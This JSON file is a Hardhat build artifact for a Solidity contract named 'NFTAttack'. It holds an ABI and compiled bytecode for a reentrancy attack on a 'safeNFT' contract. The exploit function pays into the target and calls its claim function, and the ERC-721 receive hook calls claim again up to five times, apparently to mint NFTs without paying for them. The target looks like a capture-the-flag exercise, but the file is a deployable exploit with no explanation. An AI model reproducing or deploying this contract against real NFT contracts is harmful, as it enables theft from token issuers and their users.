{
  "_format": "hh-sol-artifact-1",
  "contractName": "NFTAttack",
  "sourceName": "contracts/safeNft.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "addre",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "add",
      "outputs": [
        {
          "internalType": "contract safeNFT",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "i",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_from",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040516108bb3803806108bb833981810160405281019061002591906100ce565b806001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100fb565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009b82610070565b9050919050565b6100ab81610090565b81146100b657600080fd5b50565b6000815190506100c8816100a2565b92915050565b6000602082840312156100e4576100e361006b565b5b60006100f2848285016100b9565b91505092915050565b6107b18061010a6000396000f3fe60806040526004361061003f5760003560e01c8063150b7a02146100445780634f2be91f1461008157806363d9b770146100ac578063e5aa3d58146100b6575b600080fd5b34801561005057600080fd5b5061006b600480360381019061006691906104d0565b6100e1565b6040516100789190610593565b60405180910390f35b34801561008d57600080fd5b506100966101d7565b6040516100a3919061060d565b60405180910390f35b6100b46101fb565b005b3480156100c257600080fd5b506100cb610305565b6040516100d89190610637565b60405180910390f35b60006101216040518060400160405280601281526020017f7265656e7472616e6379206578706c6f6974000000000000000000000000000081525061030b565b600560005410156101c45760008081548092919061013e90610681565b919050555060018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e71d92d6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101ab57600080fd5b505af11580156101bf573d6000803e3d6000fd5b505050505b63150b7a0260e01b905095945050505050565b60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663bff29cee662386f26fc100006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026a57600080fd5b505af115801561027e573d6000803e3d6000fd5b505050505060018054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e71d92d6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102eb57600080fd5b505af11580156102ff573d6000803e3d6000fd5b50505050565b60005481565b6103a18160405160240161031f9190610759565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506103a4565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610402826103d7565b9050919050565b610412816103f7565b811461041d57600080fd5b50565b60008135905061042f81610409565b92915050565b6000819050919050565b61044881610435565b811461045357600080fd5b50565b6000813590506104658161043f565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f8401126104905761048f61046b565b5b8235905067ffffffffffffffff8111156104ad576104ac610470565b5b6020830191508360018202830111156104c9576104c8610475565b5b9250929050565b6000806000806000608086880312156104ec576104eb6103cd565b5b60006104fa88828901610420565b955050602061050b88828901610420565b945050604061051c88828901610456565b935050606086013567ffffffffffffffff81111561053d5761053c6103d2565b5b6105498882890161047a565b92509250509295509295909350565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b61058d81610558565b82525050565b60006020820190506105a86000830184610584565b92915050565b6000819050919050565b60006105d36105ce6105c9846103d7565b6105ae565b6103d7565b9050919050565b60006105e5826105b8565b9050919050565b60006105f7826105da565b9050919050565b610607816105ec565b82525050565b600060208201905061062260008301846105fe565b92915050565b61063181610435565b82525050565b600060208201905061064c6000830184610628565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061068c82610435565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036106be576106bd610652565b5b600182019050919050565b600081519050919050565b600082825260208201905092915050565b60005b838110156107035780820151818401526020810190506106e8565b60008484015250505050565b6000601f19601f8301169050919050565b600061072b826106c9565b61073581856106d4565b93506107458185602086016106e5565b61074e8161070f565b840191505092915050565b600060208201905081810360008301526107738184610720565b90509291505056fea2646970667358221220cb17921480d954fdfffe67ca08a2c886767169789618a4bf84df7e7045ef1ff064736f6c63430008110033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}